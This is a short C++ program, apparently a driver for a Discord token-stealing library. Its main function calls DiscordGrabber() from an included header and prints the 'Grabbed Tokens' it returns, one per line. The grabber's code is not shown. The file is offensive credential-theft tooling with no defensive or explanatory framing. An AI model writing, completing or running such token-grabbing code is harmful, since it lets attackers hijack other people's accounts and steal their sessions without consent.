#include <exports.h>
#include <iostream>

int main() {


	auto tokens = DiscordGrabber();

	std::cout << "Grabbed Tokens: " << std::endl;

	for (size_t a = 0; tokens[a] != '\0'; a++) {
		if (tokens[a] == ':') {
			std::cout << "\n";
		}
		else {
			std::cout << tokens[a];
		}
	}

	std::cin.get();

	return 0;
}
